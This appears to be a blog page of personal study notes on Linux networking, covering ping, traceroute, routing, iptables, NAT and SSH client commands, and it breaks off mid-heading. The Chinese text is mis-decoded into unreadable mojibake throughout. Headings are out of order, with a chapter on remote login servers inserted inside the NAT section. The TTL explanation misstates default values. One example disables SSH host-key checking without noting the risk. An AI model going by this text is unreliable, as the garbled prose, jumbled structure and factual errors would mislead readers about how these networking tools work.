id="5-2-1-ä¸¤å°ä¸»æœºçš„ä¸¤ç‚¹æ²Ÿé€š-ping"><a href="#5-2-1-ä¸¤å°ä¸»æœºçš„ä¸¤ç‚¹æ²Ÿé€š-ping" class="headerlink" title="5.2.1 ä¸¤å°ä¸»æœºçš„ä¸¤ç‚¹æ²Ÿé€š: ping"></a>5.2.1 ä¸¤å°ä¸»æœºçš„ä¸¤ç‚¹æ²Ÿé€š: ping</h3><p>TTL çš„é»˜è®¤å€¼ä¸º 255.</p><p>å¦‚æœä½ çš„ä¸»æœºä¸å¸¦æ£€æµ‹ä¸»æœºå¹¶ä¸åœ¨åŒä¸€ä¸ªç½‘ç»œå†…, é‚£ä¹ˆ TTL é»˜è®¤ä½¿ç”¨ 255, å¦‚æœæ˜¯åŒä¸€ä¸ªç½‘ç»œå†…, é‚£ä¹ˆ TTL åˆ™é»˜è®¤ä½¿ç”¨ 64.</p><h3 id="5-2-2-ä¸¤ä¸»æœºé—´å„èŠ‚ç‚¹åˆ†æ-traceroute"><a href="#5-2-2-ä¸¤ä¸»æœºé—´å„èŠ‚ç‚¹åˆ†æ-traceroute" class="headerlink" title="5.2.2 ä¸¤ä¸»æœºé—´å„èŠ‚ç‚¹åˆ†æ: traceroute"></a>5.2.2 ä¸¤ä¸»æœºé—´å„èŠ‚ç‚¹åˆ†æ: traceroute</h3><p>traceroute ä¼šå¯¹æ¯ä¸ªèŠ‚ç‚¹åš UDP çš„å›å£°ç­‰å¾…, å¹¶ä¾¦æµ‹å›å¤çš„æ—¶é—´, æ¯èŠ‚ç‚¹ä¾¦æµ‹ä¸‰æ¬¡, æœ€ç»ˆå›ä¼ ç»“æœ.</p><p>å›ä¼ çš„æ˜Ÿå·è¡¨æ˜, è¯¥èŠ‚ç‚¹æœ‰æŸäº›é˜²æŠ¤æªæ–½, è®©æˆ‘ä»¬å‘é€çš„æ•°æ®åŒ…è¢«ä¸¢å¼ƒ.</p><p>æŸäº›è·¯ç”±å™¨ä¸æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„å„é¡¹ä¾¦æµ‹.<br><img src="/../img/traceroute_usage.png"></p><h3 id="5-2-4-æ£€æµ‹ä¸»æœºåä¸-IP-çš„å¯¹åº”-host-nslookup"><a href="#5-2-4-æ£€æµ‹ä¸»æœºåä¸-IP-çš„å¯¹åº”-host-nslookup" class="headerlink" title="5.2.4 æ£€æµ‹ä¸»æœºåä¸ IP çš„å¯¹åº”: host, nslookup"></a>5.2.4 æ£€æµ‹ä¸»æœºåä¸ IP çš„å¯¹åº”: host, nslookup</h3><p>host å‘½ä»¤å¯ä»¥ç”¨æ¥æŸ¥å‡ºæŸä¸ªä¸»æœºåçš„ IP. è¿™ä¸ª IP æ˜¯å‘ <code>/etc/resolv.conf</code> æ–‡ä»¶ä¸­çš„ DNS æœåŠ¡å™¨æŸ¥è¯¢çš„.</p><p>ä¹Ÿå¯æŒ‡å®šæŸ¥è¯¢ä¸»æœº.</p><h2 id="5-3-è¿œç¨‹è¿æ¥å‘½ä»¤ä¸å³æ—¶é€šä¿¡è½¯ä»¶"><a href="#5-3-è¿œç¨‹è¿æ¥å‘½ä»¤ä¸å³æ—¶é€šä¿¡è½¯ä»¶" class="headerlink" title="5.3 è¿œç¨‹è¿æ¥å‘½ä»¤ä¸å³æ—¶é€šä¿¡è½¯ä»¶"></a>5.3 è¿œç¨‹è¿æ¥å‘½ä»¤ä¸å³æ—¶é€šä¿¡è½¯ä»¶</h2><p>å¯ä»¥é€šè¿‡ Telent, SSH, æˆ–è€… FTP ç­‰åè®®æ¥è¿›è¡Œè¿œç¨‹ä¸»æœºç™»å½•.</p><h1 id="ç¬¬8ç« -è·¯ç”±è§‚å¿µä¸è·¯ç”±å™¨è®¾å®š"><a href="#ç¬¬8ç« -è·¯ç”±è§‚å¿µä¸è·¯ç”±å™¨è®¾å®š" class="headerlink" title="ç¬¬8ç«  è·¯ç”±è§‚å¿µä¸è·¯ç”±å™¨è®¾å®š"></a>ç¬¬8ç«  è·¯ç”±è§‚å¿µä¸è·¯ç”±å™¨è®¾å®š</h1><h2 id="8-1-è·¯ç”±"><a href="#8-1-è·¯ç”±" class="headerlink" title="8.1 è·¯ç”±"></a>8.1 è·¯ç”±</h2><h3 id="8-1-1-è·¯ç”±è¡¨äº§ç”Ÿçš„ç±»å‹"><a href="#8-1-1-è·¯ç”±è¡¨äº§ç”Ÿçš„ç±»å‹" class="headerlink" title="8.1.1 è·¯ç”±è¡¨äº§ç”Ÿçš„ç±»å‹"></a>8.1.1 è·¯ç”±è¡¨äº§ç”Ÿçš„ç±»å‹</h3><p>æ¯ä¸€å°ä¸»æœºéƒ½æœ‰è‡ªå·±çš„è·¯ç”±è¡¨.</p><p>æŸ¥çœ‹è·¯ç”±è¡¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ route -n<br></code></pre></td></tr></table></figure><p>è·¯ç”±è¡¨ä¸»è¦æœ‰è¿™å‡ ç§æƒ…å†µæ¥è®¾è®¡:</p><ul><li>ä¾æ®ç½‘ç»œæ¥å£äº§ç”Ÿçš„ IP è€Œå­˜åœ¨çš„è·¯ç”±</li><li>æ‰‹åŠ¨æˆ–é¢„è®¾è·¯ç”± (default route), è¦æ³¨æ„, æ‰€è§„åˆ’çš„è·¯ç”±å¿…é¡»æ˜¯ä½ çš„è£…ç½®å¯ä»¥ç›´æ¥æ²Ÿé€šçš„</li></ul><h3 id="8-1-2-ä¸€ä¸ªç½‘å¡ç»‘å¤šä¸ª-IP-IP-Alias-çš„æµ‹è¯•ç”¨é€”"><a href="#8-1-2-ä¸€ä¸ªç½‘å¡ç»‘å¤šä¸ª-IP-IP-Alias-çš„æµ‹è¯•ç”¨é€”" class="headerlink" title="8.1.2 ä¸€ä¸ªç½‘å¡ç»‘å¤šä¸ª IP: IP Alias çš„æµ‹è¯•ç”¨é€”"></a>8.1.2 ä¸€ä¸ªç½‘å¡ç»‘å¤šä¸ª IP: IP Alias çš„æµ‹è¯•ç”¨é€”</h3><p>åˆ©ç”¨ <code>ifconfig</code> å‘½ä»¤å¯ä»¥åœ¨ eth0 ä¸Šæ¨¡æ‹Ÿå‡ºä¸€ä¸ªè™šæ‹Ÿæ¥å£.</p><p>IP è·¯ç”±å™¨çš„è®¾ç½®é€šå¸¸æ˜¯ä½¿ç”¨ WWW æ¥å£æ¥æä¾›çš„, è¿™ä¸ª IP è·¯ç”±å™¨é€šå¸¸ä¼šç»™äºˆä¸€ä¸ªç§æœ‰ IP, å³ 192.168.0.1 æ¥è®©ç”¨æˆ·å¼€å¯ WWW æ¥å£çš„é¢„è§ˆ.</p><p>æ‰€æœ‰çš„ IP Alias éƒ½æ˜¯ç”±å®ä½“ç½‘å¡ä»¿çœŸæ¥çš„, æ‰€ä»¥åœ¨å¯åŠ¨ eth0:n çš„æ¨¡æ‹Ÿç½‘å¡æ—¶, eth0 å¿…é¡»è¦å…ˆè¢«å¯åŠ¨.</p><h4 id="å¼€æœºæ—¶å¯åŠ¨-IP-alias"><a href="#å¼€æœºæ—¶å¯åŠ¨-IP-alias" class="headerlink" title="å¼€æœºæ—¶å¯åŠ¨ IP alias"></a>å¼€æœºæ—¶å¯åŠ¨ IP alias</h4><p>å»ºç«‹ <code>/etc/sysconfig/network-scripts/ifcfg-eth0:0</code> é…ç½®æ–‡ä»¶.</p><h3 id="8-1-3-é‡å¤è·¯ç”±é—®é¢˜"><a href="#8-1-3-é‡å¤è·¯ç”±é—®é¢˜" class="headerlink" title="8.1.3 é‡å¤è·¯ç”±é—®é¢˜"></a>8.1.3 é‡å¤è·¯ç”±é—®é¢˜</h3><p>åŒä¸€éƒ¨ä¸»æœºä¸Šé¢è®¾å®šç›¸åŒç½‘åŸŸçš„ IP æ—¶, å¾—ç‰¹åˆ«ç•™æ„ä½ çš„è·¯ç”±è§„åˆ™.</p><h2 id="8-2-è·¯ç”±å™¨æ¶è®¾"><a href="#8-2-è·¯ç”±å™¨æ¶è®¾" class="headerlink" title="8.2 è·¯ç”±å™¨æ¶è®¾"></a>8.2 è·¯ç”±å™¨æ¶è®¾</h2><p>è·¯ç”±å™¨ä¼šåˆ†ææ¥æºç«¯æ•°æ®åŒ…çš„ IP è¡¨å¤´, åœ¨è¡¨å¤´å†…æ‰¾å‡ºè¦é€è¾¾çš„ç›®æ ‡ IP åé€šè¿‡è·¯ç”±å™¨æœ¬èº«çš„è·¯ç”±è¡¨ (routing table) æ¥å°†è¿™ä¸ªæ•°æ®åŒ…å‘ä¸‹ä¸€ä¸ªç›®æ ‡(next hop) ä¼ é€.</p><p>æŸ¥çœ‹å†…æ ¸æ˜¯å¦å¯åŠ¨äº†ä¼ é€’æ•°æ®åŒ…çš„èƒ½åŠ›:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p>è¾“å‡ºä¸­ä¸º <code>1</code> è¡¨ç¤ºå¯åŠ¨äº†.</p><p>ç›´æ¥ä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶çš„å†…å®¹, å¯ä»¥åœ¨å¼€æœºå¯åŠ¨æ—¶å¯åŠ¨.</p><ul><li>é™æ€è·¯ç”±, ç½‘åŸŸå˜åŒ–éœ€è¦æ‰‹åŠ¨åˆ©ç”¨ route æŒ‡ä»¤ä¿®æ”¹.</li><li>åŠ¨æ€è·¯ç”±, è‡ªåŠ¨ä¾¦æµ‹ç½‘åŸŸçš„å˜åŒ–å¹¶ç›´æ¥ä¿®æ”¹ Linux å†…æ ¸çš„è·¯ç”±è¡¨ä¿¡æ¯.</li></ul><h3 id="8-2-3-é™æ€è·¯ç”±ä¹‹è·¯ç”±å™¨"><a href="#8-2-3-é™æ€è·¯ç”±ä¹‹è·¯ç”±å™¨" class="headerlink" title="8.2.3 é™æ€è·¯ç”±ä¹‹è·¯ç”±å™¨"></a>8.2.3 é™æ€è·¯ç”±ä¹‹è·¯ç”±å™¨</h3><p>åªè¦æ˜¯å…·æœ‰è·¯ç”±å™¨åŠŸèƒ½çš„è®¾å¤‡ (Route A, Linux Router) éƒ½ä¼šå…·æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„æ¥å£, åˆ†åˆ«ç”¨æ¥æ²Ÿé€šä¸åŒçš„ç½‘åŸŸ, åŒæ—¶è¯¥è·¯ç”±ä¹Ÿéƒ½ä¼šå…·æœ‰ä¸€ä¸ªé¢„è®¾è·¯ç”±.</p><h1 id="ç¬¬9ç« -é˜²ç«å¢™ä¸-NAT-æœåŠ¡å™¨"><a href="#ç¬¬9ç« -é˜²ç«å¢™ä¸-NAT-æœåŠ¡å™¨" class="headerlink" title="ç¬¬9ç«  é˜²ç«å¢™ä¸ NAT æœåŠ¡å™¨"></a>ç¬¬9ç«  é˜²ç«å¢™ä¸ NAT æœåŠ¡å™¨</h1><p>Linux Netfilter ä¸ TCP Wrappers ä¸¤ä¸ªæœºåˆ¶æ¥ç®¡ç†çš„.</p><p>é€šè¿‡ Netfilter é˜²ç«å¢™æœºåˆ¶, å¯ä»¥è¾¾åˆ°è®©ç§æœ‰ IP çš„ä¸»æœºä¸Šç½‘ (IP è·¯ç”±å™¨åŠŸèƒ½), å¹¶ä¸”èƒ½å¤Ÿè®© Internet è¿åˆ°å†…éƒ¨çš„ç§æœ‰ IP æ‰€æ¶è®¾çš„ Linux æœåŠ¡å™¨ (DNAT åŠŸèƒ½).</p><h2 id="9-1-è®¤è¯†é˜²ç«å¢™"><a href="#9-1-è®¤è¯†é˜²ç«å¢™" class="headerlink" title="9.1 è®¤è¯†é˜²ç«å¢™"></a>9.1 è®¤è¯†é˜²ç«å¢™</h2><p>é˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™ä¸æœ¬æœºçš„è½¯ä»¶é˜²ç«å¢™.</p><h3 id="9-1-3-Linux-ç³»ç»Ÿä¸Šé˜²ç«å¢™çš„ä¸»è¦ç±»åˆ«"><a href="#9-1-3-Linux-ç³»ç»Ÿä¸Šé˜²ç«å¢™çš„ä¸»è¦ç±»åˆ«" class="headerlink" title="9.1.3 Linux ç³»ç»Ÿä¸Šé˜²ç«å¢™çš„ä¸»è¦ç±»åˆ«"></a>9.1.3 Linux ç³»ç»Ÿä¸Šé˜²ç«å¢™çš„ä¸»è¦ç±»åˆ«</h3><p>ä¸»è¦çš„é˜²ç«å¢™æœ‰æ•°æ®åŒ…è¿‡æ»¤å‹çš„ Netfilter ä¸ä¾æ®æœåŠ¡è½¯ä»¶ç¨‹åºä½œä¸ºåˆ†æçš„ TCP Wrappers ä¸¤ç§.</p><h4 id="1-Netfilter-æ•°æ®åŒ…è¿‡æ»¤æœºåˆ¶"><a href="#1-Netfilter-æ•°æ®åŒ…è¿‡æ»¤æœºåˆ¶" class="headerlink" title="1. Netfilter (æ•°æ®åŒ…è¿‡æ»¤æœºåˆ¶)"></a>1. Netfilter (æ•°æ®åŒ…è¿‡æ»¤æœºåˆ¶)</h4><p>æ•°æ®åŒ…è¿‡æ»¤, å³é€šè¿‡åˆ†æè¿›å…¥ä¸»æœºçš„ç½‘ç»œæ•°æ®åŒ…, å°†æ•°æ®åŒ…çš„å¤´éƒ¨æ•°æ®æå–å‡ºæ¥è¿›è¡Œåˆ†æ, ä»¥å†³å®šè¯¥è¿æ¥ä¸ºæ”¾è¡Œæˆ–æŠµæŒ¡çš„æœºåˆ¶, è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥åˆ†ææ•°æ®åŒ…å¤´éƒ¨æ•°æ®, æ‰€ä»¥åŒ…æ‹¬ MAC, IP, TCP, UDP, ICMP ç­‰æ•°æ®åŒ…çš„ä¿¡æ¯éƒ½å¯ä»¥è¿›è¡Œè¿‡æ»¤åˆ†æ.</p><p>Linux ä½¿ç”¨å†…æ ¸å†…å»ºçš„ Netfilter æœºåˆ¶, æä¾› iptables è¿™ä¸ªè½¯ä»¶æ¥ä½œä¸ºé˜²ç«å¢™æ•°æ®åŒ…è¿‡æ»¤çš„æŒ‡ä»¤.</p><h4 id="2-TCP-Wrappers-ç¨‹åºç®¡ç†"><a href="#2-TCP-Wrappers-ç¨‹åºç®¡ç†" class="headerlink" title="2. TCP Wrappers (ç¨‹åºç®¡ç†)"></a>2. TCP Wrappers (ç¨‹åºç®¡ç†)</h4><p>åˆ†æè°å¯¹æŸç¨‹åºè¿›è¡Œè®¿é—®, é€šè¿‡è§„åˆ™å»åˆ†æè¯¥æœåŠ¡å™¨ç¨‹åºè°èƒ½å¤Ÿè¿æ¥, è°ä¸èƒ½è¿æ¥.</p><p>å…¶ä¸å¯åŠ¨çš„ç«¯å£æ— å…³, åªä¸ç¨‹åºçš„åç§°æœ‰å…³.</p><h2 id="9-5-NAT-æœåŠ¡å™¨è®¾å®š"><a href="#9-5-NAT-æœåŠ¡å™¨è®¾å®š" class="headerlink" title="9.5 NAT æœåŠ¡å™¨è®¾å®š"></a>9.5 NAT æœåŠ¡å™¨è®¾å®š</h2><p>NAT æ˜¯ Network Address Translation çš„ç¼©å†™.</p><h3 id="9-5-1-ä»€ä¹ˆæ˜¯-NAT-SNAT-DNAT"><a href="#9-5-1-ä»€ä¹ˆæ˜¯-NAT-SNAT-DNAT" class="headerlink" title="9.5.1 ä»€ä¹ˆæ˜¯ NAT ? SNAT ? DNAT ?"></a>9.5.1 ä»€ä¹ˆæ˜¯ NAT ? SNAT ? DNAT ?</h3><h4 id="3-Proxy-ä»£ç†æœåŠ¡å™¨"><a href="#3-Proxy-ä»£ç†æœåŠ¡å™¨" class="headerlink" title="3. Proxy (ä»£ç†æœåŠ¡å™¨)"></a>3. Proxy (ä»£ç†æœåŠ¡å™¨)</h4><h1 id="ç¬¬11ç« -è¿œç¨‹è”æœºæœåŠ¡å™¨-SSH-x2F-XDMCP-x2F-VNC-x2F-RDP"><a href="#ç¬¬11ç« -è¿œç¨‹è”æœºæœåŠ¡å™¨-SSH-x2F-XDMCP-x2F-VNC-x2F-RDP" class="headerlink" title="ç¬¬11ç«  è¿œç¨‹è”æœºæœåŠ¡å™¨ SSH &#x2F; XDMCP &#x2F; VNC &#x2F; RDP"></a>ç¬¬11ç«  è¿œç¨‹è”æœºæœåŠ¡å™¨ SSH &#x2F; XDMCP &#x2F; VNC &#x2F; RDP</h1><p>ç”±äºä¿®æ”¹çš„ IP ä¸ä¸€æ ·, åˆ†ä¸º:</p><ul><li>SNAT (Source NAT, ä¿®æ”¹ Source IP)</li><li>DNAT (Destination NAT, ä¿®æ”¹ Destination IP)</li></ul><p>æœ€å¸¸è§çš„ IP åˆ†äº«å™¨å°±æ˜¯ä¸€ä¸ªè·¯ç”±å™¨, è¿™ä¸ª IP åˆ†äº«å™¨ä¸€å®šä¼šæœ‰ä¸€ä¸ª Public IP å’Œä¸€ä¸ª Private IP.</p><p>æ¯”å¦‚:</p><ul><li>å¤–éƒ¨æ¥å£ç”¨ eth0, è¿™ä¸ªæ¥å£æœ‰ public IP</li><li>å†…éƒ¨æ¥å£ç”¨ eth1, å‡è®¾ IP ä¸º 192.168.100.254</li></ul><h3 id="9-5-2-æœ€ç®€å•çš„-NAT-æœåŠ¡å™¨-IP-åˆ†äº«åŠŸèƒ½"><a href="#9-5-2-æœ€ç®€å•çš„-NAT-æœåŠ¡å™¨-IP-åˆ†äº«åŠŸèƒ½" class="headerlink" title="9.5.2 æœ€ç®€å•çš„ NAT æœåŠ¡å™¨: IP åˆ†äº«åŠŸèƒ½"></a>9.5.2 æœ€ç®€å•çš„ NAT æœåŠ¡å™¨: IP åˆ†äº«åŠŸèƒ½</h3><h2 id="11-1-è¿œç¨‹è”æœºæœåŠ¡å™¨"><a href="#11-1-è¿œç¨‹è”æœºæœåŠ¡å™¨" class="headerlink" title="11.1 è¿œç¨‹è”æœºæœåŠ¡å™¨"></a>11.1 è¿œç¨‹è”æœºæœåŠ¡å™¨</h2><h3 id="11-1-1-ä»€ä¹ˆæ˜¯è¿œç¨‹è”æœºæœåŠ¡å™¨"><a href="#11-1-1-ä»€ä¹ˆæ˜¯è¿œç¨‹è”æœºæœåŠ¡å™¨" class="headerlink" title="11.1.1 ä»€ä¹ˆæ˜¯è¿œç¨‹è”æœºæœåŠ¡å™¨"></a>11.1.1 ä»€ä¹ˆæ˜¯è¿œç¨‹è”æœºæœåŠ¡å™¨</h3><h2 id="11-2-æ–‡å­—æ¥å£è”æœºæœåŠ¡å™¨"><a href="#11-2-æ–‡å­—æ¥å£è”æœºæœåŠ¡å™¨" class="headerlink" title="11.2 æ–‡å­—æ¥å£è”æœºæœåŠ¡å™¨"></a>11.2 æ–‡å­—æ¥å£è”æœºæœåŠ¡å™¨</h2><p>SSH æ˜¯ Secure SHell protocol çš„ç®€å†™.</p><p>SSH æœ¬èº«å°±æä¾›ä¸¤ä¸ªæœåŠ¡å™¨åŠŸèƒ½:</p><ul><li>ç±»ä¼¼ telnet çš„è¿œç¨‹è”æœºä½¿ç”¨ shell çš„æœåŠ¡å™¨</li><li>ç±»ä¼¼ FTP æœåŠ¡çš„ sftp-server, æä¾›æ›´å®‰å…¨çš„ FTP æœåŠ¡</li></ul><p>éå¯¹ç§°å¯†é’¥ (Public and Private Key):</p><ul><li>å…¬é’¥ (public key), æä¾›ç»™è¿œç¨‹ä¸»æœºè¿›è¡Œæ•°æ®åŠ å¯†çš„è¡Œä¸º </li><li>ç§é’¥ (privat key), è¿œç¨‹ä¸»æœºä½¿ç”¨ä½ çš„å…¬é’¥åŠ å¯†çš„æ•°æ®, åœ¨æœ¬åœ°ç«¯èƒ½å¤Ÿä½¿ç”¨ç§é’¥æ¥è¿›è¡Œè§£å¯†</li></ul><p>æœåŠ¡å™¨ç«¯æœ‰å®¢æˆ·ç«¯çš„å…¬é’¥ä»¥åŠè‡ªå·±çš„ç§é’¥, å®¢æˆ·ç«¯æœ‰æœåŠ¡å™¨ç«¯çš„å…¬é’¥å’Œè‡ªå·±çš„ç§é’¥.</p><p>åœ¨æœåŠ¡å™¨ç«¯, æ¯ä¸€æ¬¡å¯åŠ¨ sshd æœåŠ¡, è¯¥æœåŠ¡ä¼šä¸»åŠ¨å»æ‰¾ <code>/etc/ssh/ssh_host*</code> æ–‡ä»¶ (å­˜æ”¾æˆå¯¹çš„å…¬ç§é’¥), è‹¥ç³»ç»Ÿåˆšåˆšå®‰è£…å®Œæˆ, ç”±äºæ²¡æœ‰è¿™äº›å…¬é’¥æ–‡ä»¶, å› æ­¤ sshd ä¼šä¸»åŠ¨å»è®¡ç®—å‡ºè¿™äº›éœ€è¦çš„å…¬é’¥æ–‡ä»¶, åŒæ—¶ä¹Ÿä¼šè®¡ç®—å‡ºæœåŠ¡å™¨è‡ªå·±éœ€è¦çš„ç§é’¥æ–‡ä»¶. </p><p>æœåŠ¡å™¨çš„å…¬é’¥æ•°æ®å­˜æ”¾åœ¨å®¢æˆ·ç«¯çš„ <code>~/.ssh/known_hosts</code> æ–‡ä»¶ä¸­.</p><p>å®¢æˆ·ç«¯çš„å¯†é’¥å®åœ¨éšæœºè¿ç®—äº§ç”Ÿäºæœ¬æ¬¡è”æœºå½“ä¸­çš„, æ‰€ä»¥ä½ è¿™æ¬¡çš„è”æœºä¸ä¸‹æ¬¡çš„è”æœºçš„å¯†é’¥å¯èƒ½ä¼šä¸ä¸€æ ·.</p><h3 id="å…³äº-ssh-è‡ªå·±çš„ç†è§£"><a href="#å…³äº-ssh-è‡ªå·±çš„ç†è§£" class="headerlink" title="å…³äº ssh è‡ªå·±çš„ç†è§£"></a>å…³äº ssh è‡ªå·±çš„ç†è§£</h3><p>æœåŠ¡å™¨ä¸Šè¿è¡Œ sshd è¿›ç¨‹ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œåœ¨æ¥æ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œå…ˆæŸ¥çœ‹è‡ªå·±æœ‰æ²¡æœ‰é’¥åŒ™å¯¹ï¼Œè‹¥æ²¡æœ‰åˆ™åˆ›å»ºï¼Œæœ‰åˆ™å°†è‡ªå·±çš„å…¬é’¥å‘é€ç»™å®¢æˆ·ç«¯. </p><p>å®¢æˆ·ç«¯ä¼šå°†å…¬é’¥æ•°æ®å­˜æ”¾åœ¨ <code>~/.ssh/known_hosts</code> ä¸­. å®¢æˆ·ç«¯ä¹Ÿä¼šæŸ¥çœ‹è‡ªå·±çš„é’¥åŒ™å¯¹ï¼Œå¹¶æŠŠè‡ªå·±çš„å…¬é’¥å‘ç»™æœåŠ¡å™¨ç«¯.</p><p>å…å¯†ç™»é™†çš„æ ¸å¿ƒæ˜¯ <code>authorized_keys</code> é‡Œçš„å†…å®¹ï¼Œé‡Œé¢å­˜æ”¾å…¬é’¥. åˆ›å»ºè¿™ä¸ªå…¬é’¥çš„ä¸»æœºå°±å¯ä»¥å…å¯†ç™»é™†. è¿™é‡Œå°±ç›¸å½“äºæ˜¯ç”¨å…¬é’¥æ›¿ä»£äº†ç”¨æˆ·å¯†ç .</p><h3 id="11-2-2-å¯åŠ¨-SSH-æœåŠ¡"><a href="#11-2-2-å¯åŠ¨-SSH-æœåŠ¡" class="headerlink" title="11.2.2 å¯åŠ¨ SSH æœåŠ¡"></a>11.2.2 å¯åŠ¨ SSH æœåŠ¡</h3><p>åœ¨æˆ‘çš„ Archlinux ä¸Š:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo systemctl start sshd<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¶æ„åœ¨ port 22 ä¸Šé¢.</p><p>sshd è¿™ä¸ªæœåŠ¡åŒ…å«å¾ˆå¤šæŒ‡ä»¤, åŒ…æ‹¬ <code>ssh</code>, <code>sftp</code>, <code>scp</code> ç­‰.</p><h3 id="11-2-3-ssh-å®¢æˆ·ç«¯è”æœºç¨‹åº-Linux-ç”¨æˆ·"><a href="#11-2-3-ssh-å®¢æˆ·ç«¯è”æœºç¨‹åº-Linux-ç”¨æˆ·" class="headerlink" title="11.2.3 ssh å®¢æˆ·ç«¯è”æœºç¨‹åº - Linux ç”¨æˆ·"></a>11.2.3 ssh å®¢æˆ·ç«¯è”æœºç¨‹åº - Linux ç”¨æˆ·</h3><h4 id="1-SSH-ç›´æ¥ç™»å…¥è¿œç¨‹ä¸»æœºçš„æŒ‡ä»¤"><a href="#1-SSH-ç›´æ¥ç™»å…¥è¿œç¨‹ä¸»æœºçš„æŒ‡ä»¤" class="headerlink" title="1. SSH: ç›´æ¥ç™»å…¥è¿œç¨‹ä¸»æœºçš„æŒ‡ä»¤"></a>1. SSH: ç›´æ¥ç™»å…¥è¿œç¨‹ä¸»æœºçš„æŒ‡ä»¤</h4><p>ç›´æ¥è¿æ¥ä¸»æœº:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ssh <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>åé¢ä¸åŠ ç”¨æˆ·å, å°±ä½¿ç”¨å½“å‰ç”¨æˆ·ç™»å½•.</p><p>ç¡®è®¤å…¬é’¥æŒ‡çº¹ç æ—¶, éœ€è¦ç”¨ <code>Yes</code> è€Œä¸æ˜¯ <code>Y/y</code>.</p><p>ä½¿ç”¨ student å¸å·ç™»å½•:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ssh student<span class="hljs-variable">@127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-f</code> é€‰é¡¹, åªè®©å¯¹æ–¹ä¸»æœºæ‰§è¡Œå‘½ä»¤è€Œä¸ç™»å½•.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> ssh -f student@<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> find / &amp;&amp;<span class="hljs-keyword">gt</span>; ~/find1.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-o</code> é€‰é¡¹æŒ‡å®šé¡¹ç›®:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$ ssh -o StrictHostKeyChecking=<span class="hljs-literal">no</span> root@localhost<br></code></pre></td></tr></table></figure><p><code>StrictHostKeyChecking=no</code> èƒ½å¤Ÿä¸éœ€è¦ <code>Yes</code> ç¡®è®¤æ·»åŠ ä¸»æœºåˆ° <code>known_host</code> æ–‡ä»¶ä¸­.</p><h4 id="2-æœåŠ¡å™¨å…¬é’¥è®°å½•æ–‡ä»¶-ssh-known-hosts"><a href="#2-æœåŠ¡å™¨å…¬é’¥è®°å½•æ–‡ä»¶-ssh-known-hosts" class="headerlink" title="2. æœåŠ¡å™¨å…¬é’¥è®°å½•æ–‡ä»¶: ~/.ssh/known_hosts"></a>2. æœåŠ¡å™¨å…¬é’¥è®°å½•æ–‡ä»¶: <code>~/.ssh/known_hosts</code></h4><p>å½“ä½ ç™»å…¥è¿œç¨‹æœåŠ¡å™¨æ—¶, æœ¬æœºä¼šä¸»åŠ¨çš„ç”¨æ¥å—åˆ°çš„æœåŠ¡å™¨çš„ public key å»å¯¹æ¯” <code>~/.ssh/known_hosts</code> ä¸­æœ‰æ— ç›¸å…³çš„å…¬é’¥.</p><p>ä¼ªè£… ssh æœåŠ¡å™¨, å°±æ˜¯è¿”å›ä¼ªè£…è€…çš„å…¬é’¥.</p><p>è‹¥é‡åˆ°å› ä¸ºå…¬é’¥ä¸åŒè€Œå¯¼è‡´çš„æ— æ³•ç™»å…¥, å¯ä»¥é€‰æ‹©åˆ é™¤ <code>~/.ssh/known_hosts</code> å†é‡æ–°æ·»åŠ .</p><h4 id="3-æ¨¡æ‹Ÿ-FTP-çš„æ–‡ä»¶ä¼ è¾“æ–¹å¼-sftp"><a href="#3-æ¨¡æ‹Ÿ-FTP-çš„æ–‡ä»¶ä¼ è¾“æ–¹å¼-sftp" class="headerlink" title="3. æ¨¡æ‹Ÿ FTP çš„æ–‡ä»¶ä¼ è¾“æ–¹å¼: sftp"></a>3. æ¨¡æ‹Ÿ FTP çš„æ–‡ä»¶ä¼ è¾“æ–¹å¼: sftp</h4><p><code>sftp</code> å’Œ <code>scp</code> (è¿™ä¸ª cp æ˜¯ copy) è¿™ä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯ä½¿ç”¨ <code>ssh</code> çš„éš§é“ (port 22), åªæ˜¯æ¨¡æ‹Ÿæˆ FTP ä¸å¤åˆ¶çš„åŠ¨ä½œ.</p><p>ç™»å½•:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sftp student<span class="hljs-variable">@localhost</span><br></code></pre></td></tr></table></figure><p>æœ‰å¾ˆå¤šæŒ‡ä»¤, å¤§éƒ¨åˆ†å’Œ bash æŒ‡ä»¤ç›¸åŒ, å…·ä½“è§ä¹¦.</p><h4 id="4-æ–‡ä»¶å¼‚åœ°ç›´æ¥å¤åˆ¶-SCP"><a href="#4-æ–‡ä»¶å¼‚åœ°ç›´æ¥å¤åˆ¶-SCP" class="headerlink" title="4. 